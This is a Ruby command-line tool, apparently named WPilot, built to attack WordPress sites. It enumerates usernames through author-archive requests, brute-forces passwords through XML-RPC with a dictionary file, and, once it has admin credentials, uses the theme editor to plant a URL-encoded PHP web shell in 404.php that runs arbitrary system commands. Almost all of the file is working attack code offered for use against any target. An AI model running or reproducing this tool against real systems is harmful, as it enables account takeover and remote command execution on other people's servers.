
#!/usr/bin/env ruby
# encoding: utf-8


require 'net/http'
require 'optparse'



  ############################################################################
  ############################  Define color  ################################
  ############################################################################
  def colorize(text, color_code)
    "\e[#{color_code}m#{text}\e[0m"
  end

  def 
    red(text); colorize(text, 31); 
    end
  def 
    green(text); colorize(text, 32);
  end
  
  def 
    yellow(text); colorize(text, 33); 
  end

  def 
    pink(text); colorize(text, 35); 
  end



def check_vulnerable (target)
  puts green("[Info]     Checking if the target is vulnerable........")
  url='http://'+target+'/xmlrpc.php'
    
  begin 
    res = Net::HTTP.get_response(URI.parse(url.to_s))

    if (res.body.include? 'XML-RPC server accepts POST requests only' ) && (res.code.include? '200' )
        bVulnerable= true
        puts yellow("[Info]     Target is vulnerable!!!")
    else
        puts yellow("[Info]     Target is not vulnerable.")
        bVulnerable= false

    end

    return bVulnerable
  rescue Exception => e
    puts red("[Error]   An error occurred during the vulnerability check: "+ e.to_s)
    exit 1
  end  


end





def getUnames(target)
  puts green("[Info]     Retreving usernames........")
  i=1
  bNoMoreUser=false
  names=Array.new

  sStart='archive author author-'
  begin

    begin
      url='http://'+target+'/?author='+i.to_s
      res = Net::HTTP.get_response(URI.parse(url.to_s))


      if res.code.include? '200'
        body=res.body
        username= body[body.index(sStart)+sStart.length, 20]
        username=username[0,username.index(/\s/)]
        puts yellow("[Info]     Found username: "+username)
                     
        names<<username
      else
        bNoMoreUser=true
      end

      i+=1

    rescue Exception => e
      puts red("[Error]   An error occurred during the user name enumeration: "+ e.to_s)
      exit 1
    end 

  end until bNoMoreUser==true

 # chk if get name
if (names.any?)==false
  puts green("[Info]     No username was found.")
  exit 1
elsif  (names.any?)==true
  return names
end

end


def Bruteforce (names, dpath, target)
  puts green("[Info]     Bruteforcing passwords ........")
  bcracked=false
  badmincracked=false
  admincreds=Hash.new
  text=File.open(dpath).read
  text.gsub!(/\r\n?/, "\n")
  names.each{
    |username|
    text.each_line do |line|
      passwd="#{line}"

      xml_data = %{<?xml version="1.0" encoding="UTF-8"?><methodCall>  <methodName>wp.getUsersBlogs</methodName>  <params>   <param><value>}
      xml_data = xml_data+username
      xml_data =xml_data +%{</value></param> <param><value>}
      xml_data = xml_data+passwd
      xml_data =xml_data +%{</value></param>  </params></methodCall>}
               
      begin
        if target.index('/').nil?
          host=target
          urlpath='/xmlrpc.php'
        else
           host=target[0,target.index('/')]
           urlpath=target[target.index('/'),target.length]+'/xmlrpc.php'
        end


        http = Net::HTTP.new(host)
        res = http.post(urlpath, xml_data)

        if (res.body.include? 'isAdmin</name><value><boolean>0' ) && (res.code.include? '200' )                 

          puts pink("[Info]     Cracked Non-admin Creds: "+ username+":"+passwd.tr("\n",""))
          bcracked=true
          break
        elsif (res.body.include? 'isAdmin</name><value><boolean>1' ) && (res.code.include? '200' )
          puts red("[Info]     Cracked Admin Creds: "+ username+":"+passwd.tr("\n",""))
          bcracked=true
          badmincracked=true
          admincreds={username=>passwd}
          break
        end #end if
      rescue Exception => e
        puts red("[Error]   An error occurred during the password Bruteforce: "+ e.to_s)
        exit 1
      end 
    end#end text.each
  }

  if bcracked==false
    puts green("[Info]     No Creds have been cracked.") 
    puts green("[Info]     Program is exiting.") 
    exit 1
  elsif badmincracked==true
    return admincreds
  end
end
              

def exploit(target,dict)
   
  if (check_vulnerable(target)==true)
    auth=Bruteforce(getUnames(target), dict, target)
    uname, pwd = auth.first
  

    puts pink("[Info]     Uploading shell into 404.php..........")
    #retrieve cookie
    plogindata='log='+uname+'&pwd='+pwd+'&wp-submit=Log+In'

    begin
      if target.index('/').nil?
        host=target
        urlpathLogin='/wp-login.php'
        urlpathEditor='/wp-admin/theme-editor.php'
      else
        host=target[0,target.index('/')]
        urlpathLogin=target[target.index('/'),target.length]+'/wp-login.php'
        urlpathEditor=target[target.index('/'),target.length]+'/wp-admin/theme-editor.php'
      end

      http = Net::HTTP.new(host)
      res = http.post(urlpathLogin, plogindata)


      cookies=''
      res.get_fields('set-cookie').each do |cookie|
        cookies+=cookie[0,cookie.index(';')+1]
      end

      res = http.request_get(urlpathEditor+'?file=404.php&theme=',initheader = {'Cookie' =>cookies})

      keyword='name="_wpnonce" value="'
      nonce= res.body[res.body.index(keyword)+keyword.length,10 ]
          
      phpshell='%3c%3f%70%68%70%0a%24%72%65%67%69%73%74%65%72%5f%67%6c%6f%62%61%6c%73%20%3d%20%28%62%6f%6f%6c%29%20%69%6e%69%5f%67%65%74%28%27%72%65%67%69%73%74%65%72%5f%67%6f%62%61%6c%73%27%29%3b%0a%69%66%20%28%24%72%65%67%69%73%74%65%72%5f%67%6c%6f%62%61%6c%73%29%20%24%73%76%72%20%3d%20%67%65%74%65%6e%76%28%53%45%52%56%45%52%5f%4e%41%4d%45%29%3b%0a%65%6c%73%65%20%24%73%76%72%20%3d%20%24%5f%53%45%52%56%45%52%5b%27%53%45%52%56%45%52%5f%4e%41%4d%45%27%5d%3b%0a%3f%3e%0a%3c%68%74%6d%6c%3e%0a%3c%68%65%61%64%3e%0a%3c%74%69%74%6c%65%3e%41%6e%64%79%27%73%20%50%6f%77%65%72%3c%2f%74%69%74%6c%65%3e%0a%3c%2f%68%65%61%64%3e%0a%3c%62%6f%64%79%3e%0a%3c%66%6f%72%6d%20%65%6e%63%74%79%70%65%3d%22%6d%75%6c%74%69%70%61%72%74%2f%66%6f%72%6d%2d%64%61%74%61%22%20%6d%65%74%68%6f%64%3d%22%50%4f%53%54%22%3e%0a%3c%62%72%3e%0a%5b%4e%42%42%40%3c%3f%70%68%70%20%65%63%68%6f%20%24%73%76%72%20%3f%3e%20%2f%5d%23%0a%20%20%3c%69%6e%70%75%74%20%74%79%70%65%3d%22%74%65%78%74%22%20%6e%61%6d%65%3d%22%63%6d%64%22%20%76%61%6c%75%65%3d%22%22%3e%0a%20%20%3c%69%6e%70%75%74%20%74%79%70%65%3d%22%73%75%62%6d%69%74%22%20%76%61%6c%75%65%3d%22%45%6e%74%65%72%22%3e%0a%3c%2f%66%6f%72%6d%3e%0a%3c%62%72%3e%0a%3c%68%72%20%77%69%64%74%68%3d%22%37%35%25%22%20%61%6c%69%67%6e%3d%22%6c%65%66%74%22%3e%0a%3c%62%72%3e%0a%3c%2f%62%6f%64%79%3e%0a%3c%2f%68%74%6d%6c%3e%0a%3c%3f%70%68%70%0a%24%63%6d%64%20%3d%20%24%5f%50%4f%53%54%5b%27%63%6d%64%27%5d%3b%20%69%66%28%24%63%6d%64%29%20%7b%20%65%63%68%6f%20%27%3c%70%72%65%3e%27%3b%20%65%63%68%6f%20%24%6c%61%73%74%5f%6c%69%6e%65%20%3d%20%73%79%73%74%65%6d%28%24%63%6d%64%29%3b%20%65%63%68%6f%20%27%3c%2f%70%72%65%3e%3c%62%72%3e%27%3b%20%7d%0a%3f%3e%0a'
      payloadata='_wpnonce='+nonce+'&newcontent='+phpshell+'&action=update&file=404.php&submit=Update%20File'

      res = http.post(urlpathEditor,payloadata,initheader = {'Cookie' =>cookies})
      puts pink("\e[1m[DONE]     Please check a non existing post for the uploaded web shell\e[0m")


    rescue Exception => e
      puts red("[Error]   An error occurred during the exploitation: "+ e.to_s)
      exit 1
    end 
  end

end



options = {}
optparse = OptionParser.new do|opts|
opts.banner =yellow(" _    _ ______  _  _          
| |  | || ___ \\(_)| |       | |  
| |  | || |_/ / _ | |  ___  | |_      
| |/\\| ||  __/ | || | / _ \\ | __|       
\\  /\\  /| |    | || || (_) || |_          Basic Version - 0.1 by Andy Yang
 \\/  \\/ \\_|    |_||_| \\___/ \\__|          contactayang[AT]gmail[DOT]com
                                 ")
    opts.separator  "WPiolt - Wordpress Bruteforce tool via XML-RPC by Andy Yang"
    opts.separator ""
    opts.separator  "EXAMPLE USAGE:"
    opts.separator  "     ./WPilot.rb  -t 'www.target.com' -d \'/User/eve/dic.txt\'"
    opts.separator "     ./WPilot.rb  -t '10.0.0.1/wordpress' -d \'/User/eve/dic.txt\'"
    opts.separator ""
    # Define the options
    options[:target] = nil
    opts.on( '-t', '--Target URL/IP', 'Wordpress target URL or IP') do|target|
      options[:target] = target  

    end
     
    options[:dic] = nil
    opts.on( '-d', '--Dictionary path', 'Dictionary file for password Bruteforce.' ) do |filepath|
       options[:dic] = filepath
     end      
    opts.on( '-h', '--help', 'Display help' ) do
    puts opts
    exit
    end
   end
   
   begin optparse.parse! ARGV  
   rescue OptionParser::InvalidOption => e
    puts e
    puts optparse
    exit 1
  end 
 



if (options[:target] == nil or options[:dic] == nil) 
  puts green("[Info]     Please supply target and dictionary file. ")
  puts green("[Info]     For more infomation please refer to the followings usage:")
  puts optparse
elsif (File.exist?(options[:dic])==false or File.readable?(options[:dic])==false)
  puts red("[Fail]  "+options[:dic]+" file is not exist or readable!!!")
  puts optparse

else 
    
  puts t=options[:target]
  puts d=options[:dic]
  exploit(t,d)

end


